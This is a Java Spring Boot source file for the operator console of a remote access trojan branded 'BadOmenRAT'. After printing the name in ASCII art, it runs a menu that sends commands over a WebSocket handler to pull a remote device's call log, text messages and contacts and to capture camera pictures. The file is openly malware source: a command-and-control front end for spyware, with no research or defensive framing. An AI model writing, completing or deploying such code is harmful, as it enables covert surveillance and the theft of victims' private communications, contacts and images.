package tosatto.simonepio;

import org.apache.tomcat.websocket.WsWebSocketContainer;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.ConfigurableApplicationContext;

import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.IOException;
import java.util.Scanner;

@SpringBootApplication
public class WebSocketBadOmenApplication extends WsWebSocketContainer {
	private static Scanner in;

	public static void main(String[] args) {
		ConfigurableApplicationContext context = SpringApplication.run(WebSocketBadOmenApplication.class, args);
		clearConsole();
		printAsciiArt();
		menu();
		context.close();
	}

	private static void menu() {
		String command = "";
		in = new Scanner(System.in);
		while (!command.equalsIgnoreCase("exit")) {
			System.out.println("[calls] Get the calls log");
			System.out.println("[msg] Get messages");
			System.out.println("[contacts] Get contacts");
			System.out.println("[camera] Get picture from camera");
			System.out.println("[exit] Quit and terminate the application");
			command = in.nextLine();
			clearConsole();
			switch (command.toLowerCase()) {
			case "calls":
				WebSocketHandler.sendCommand("calls");
				break;

			case "msg":
				WebSocketHandler.sendCommand("msg");
				break;

			case "contacts":
				WebSocketHandler.sendCommand("contacts");
				break;

			case "camera":
				WebSocketHandler.sendCommand("camera");
				break;

			case "exit":
				break;

			default :
				System.out.println("Error in parsing command");
				break;
			}
			
		}
	}

	private static void clearConsole() {
		try {
			new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
		} catch (InterruptedException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	private static void printAsciiArt() {
		int width = 200;
        int height = 30;

        BufferedImage image = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB);
        Graphics g = image.getGraphics();
        g.setFont(new Font("SansSerif", Font.BOLD, 24));
		g.setColor(new Color(150,0,0));
        Graphics2D graphics = (Graphics2D) g;
        graphics.setRenderingHint(RenderingHints.KEY_TEXT_ANTIALIASING,
                RenderingHints.VALUE_TEXT_ANTIALIAS_ON);
        graphics.drawString("BadOmenRAT", 10, 20);

        for (int y = 0; y < height; y++) {
            StringBuilder sb = new StringBuilder();
            for (int x = 0; x < width; x++) {
                sb.append(image.getRGB(x, y) == -16777216 ? " " : "■");
            }

            if (sb.toString().trim().isEmpty()) {
                continue;
            }

            System.out.println(sb);
        }
	}
}
